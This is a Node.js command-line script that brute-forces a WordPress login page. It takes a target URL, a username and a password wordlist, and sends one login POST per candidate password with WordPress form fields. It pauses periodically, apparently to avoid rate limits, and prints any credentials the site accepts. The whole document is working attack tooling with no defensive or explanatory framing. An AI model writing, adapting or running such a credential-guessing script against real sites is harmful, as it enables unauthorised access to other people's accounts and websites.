#!/bin/node

const fs = require('fs');
const http = require('http');
const querystring = require('querystring');

const url = process.argv[2];
const username = process.argv[3];
const listFilePath = process.argv[4];
const chunkToWait = process.argv[5] || 4;
const restTime = process.argv[6] || 1000;

function nextLine(text, prev) {
  let line = prev;
  let valid = false;
  let i = 0;
  for (; i < text.length; i++) {
    if (text[i] !== '\n') {
      line += text[i];
    } else {
      i++;
      valid = true;
      break;
    }
  }
  return {text: text.substring(i, text.length), line, valid};
}

function makeRequest(password) {
  if (password === '') {
    return;
  }
  const formData = querystring.stringify({
    log: username,
    pwd: password,
    'wp-submit': 'Acceder'
  });
  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': formData.length
    }
  };
  new Promise((resolve, reject) => {
    const req = http.request(url, options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => {
        responseData += chunk;
      });
      res.on('end', () => {
        resolve(responseData);
      });
    });
    req.on('error', (error) => reject(error));
    req.write(formData);
    req.end();
  })
    .then(data => {
      if (!data.includes('<strong>ERROR</strong>')) {
        process.stdout.write(`\rusername: ${username}password: ${password}\n`);
      }
    })
    .catch(error => console.error(error));
}

function start() {
  const P = ["\\", "|", "/", "-"];
  let x = 0;

  const stream = fs.createReadStream(listFilePath);
  new Promise((resolve) => {
    let extraText = '';
    stream.on('data', (chunk) => {

      chunk = chunk.toString();
      let {text, line, valid} = nextLine(chunk, extraText);
      chunk = text;
      while (valid) {
        extraText = '';
        makeRequest(line);

        process.stdout.write(`\r${P[(x++) % 4]} - ${x}`);
        x++;

        if (x % chunkToWait == 0) {
          const waitTill = new Date(new Date().getTime() + restTime);
          while(waitTill > new Date()){}
        }

        let res = nextLine(chunk, extraText);
        line = res.line;
        valid = res.valid;
        chunk = res.text;
      }
      if (!valid) {
        extraText = line;
      } else {
        extraText = '';
      }
    });

    stream.on('close', (data) => {
      resolve();
    });
  });
}

start();
